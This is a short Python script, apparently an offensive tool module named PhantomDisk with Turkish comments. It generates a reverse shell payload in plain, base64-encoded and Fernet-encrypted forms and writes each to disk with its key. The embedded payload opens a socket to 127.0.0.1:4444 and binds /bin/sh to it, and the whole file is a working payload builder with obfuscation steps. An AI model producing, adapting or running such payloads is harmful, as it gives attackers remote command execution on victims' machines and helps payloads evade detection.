#!/usr/bin/env python3
"""
PhantomDisk - AutoPayload Modülü
Geliştirici: burakcanbalta | 2025
Amaç: RAM içinde şifreli, base64 ve düz reverse shell payload'ları üretmek.
"""

import os
import base64
from cryptography.fernet import Fernet

PHANTOM_PATH = "/mnt/phantomdisk"
PAYLOAD_FOLDER = os.path.join(PHANTOM_PATH, "payloads")
os.makedirs(PAYLOAD_FOLDER, exist_ok=True)

reverse_shell = '''
import socket,subprocess,os
s=socket.socket()
s.connect(("127.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
'''

# Normal reverse_shell.py
raw_path = os.path.join(PAYLOAD_FOLDER, "reverse_shell.py")
with open(raw_path, "w") as f:
    f.write(reverse_shell)

# Base64 encoded payload
b64_payload = base64.b64encode(reverse_shell.encode()).decode()
b64_path = os.path.join(PAYLOAD_FOLDER, "reverse_shell_b64.txt")
with open(b64_path, "w") as f:
    f.write(b64_payload)

# AES şifreli payload
key = Fernet.generate_key()
fernet = Fernet(key)
enc_payload = fernet.encrypt(reverse_shell.encode())
enc_path = os.path.join(PAYLOAD_FOLDER, "reverse_shell.enc")
key_path = os.path.join(PAYLOAD_FOLDER, "payload.key")

with open(enc_path, "wb") as f:
    f.write(enc_payload)
with open(key_path, "wb") as f:
    f.write(key)

print("[+] Payload'lar RAM ortamında üretildi.")
print(f"  → Python: {raw_path}")
print(f"  → Base64: {b64_path}")
print(f"  → Encrypted: {enc_path}")
print(f"  → Key: {key_path}")
